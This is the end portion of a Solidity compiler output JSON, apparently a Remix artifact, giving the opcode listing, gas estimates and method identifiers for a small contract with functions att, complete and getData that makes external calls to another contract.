					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4C2 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9D9FF80 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x3BC5DE30 EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0x93AF0292 EQ PUSH2 0x98 JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x2C1 JUMP JUMPDEST PUSH2 0xC1 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x82 PUSH2 0x13B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8F SWAP2 SWAP1 PUSH2 0x391 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBF PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xBA SWAP2 SWAP1 PUSH2 0x3B3 JUMP JUMPDEST PUSH2 0x1C5 JUMP JUMPDEST STOP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE0232B42 DUP4 DUP4 PUSH2 0xE7 PUSH2 0x13B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x105 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x44E JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x133 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xC5E4DD8200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFA391C64 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x20D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x221 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x258 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x268 DUP2 PUSH2 0x24D JUMP JUMPDEST DUP2 EQ PUSH2 0x273 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x285 DUP2 PUSH2 0x25F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29E DUP2 PUSH2 0x28B JUMP JUMPDEST DUP2 EQ PUSH2 0x2A9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2BB DUP2 PUSH2 0x295 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2D8 JUMPI PUSH2 0x2D7 PUSH2 0x228 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E6 DUP6 DUP3 DUP7 ADD PUSH2 0x276 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x2F7 DUP6 DUP3 DUP7 ADD PUSH2 0x2AC JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x33B JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x320 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x363 DUP3 PUSH2 0x301 JUMP JUMPDEST PUSH2 0x36D DUP2 DUP6 PUSH2 0x30C JUMP JUMPDEST SWAP4 POP PUSH2 0x37D DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x31D JUMP JUMPDEST PUSH2 0x386 DUP2 PUSH2 0x347 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3AB DUP2 DUP5 PUSH2 0x358 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3C9 JUMPI PUSH2 0x3C8 PUSH2 0x228 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x3D7 DUP5 DUP3 DUP6 ADD PUSH2 0x276 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x405 PUSH2 0x400 PUSH2 0x3FB DUP5 PUSH2 0x22D JUMP JUMPDEST PUSH2 0x3E0 JUMP JUMPDEST PUSH2 0x22D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x417 DUP3 PUSH2 0x3EA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x429 DUP3 PUSH2 0x40C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x439 DUP2 PUSH2 0x41E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x448 DUP2 PUSH2 0x28B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x463 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x430 JUMP JUMPDEST PUSH2 0x470 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x43F JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x40 DUP4 ADD MSTORE PUSH2 0x482 DUP2 DUP5 PUSH2 0x358 JUMP JUMPDEST SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMP NOT 0xCE PUSH1 0xD7 PUSH14 0xADB9071E44F16850A49D36FE5C8C 0xB7 PUSH18 0xCEF193D83C40F9AFA6FB64736F6C63430008 SGT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "243600",
						"executionCost": "287",
						"totalCost": "243887"
					},
					"external": {
						"att(address,uint256)": "infinite",
						"complete(address)": "infinite",
						"getData()": "infinite"
					}
				},
				"methodIdentifiers": {
					"att(address,uint256)": "09d9ff80",
					"complete(address)": "93af0292",
					"getData()": "3bc5de30"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}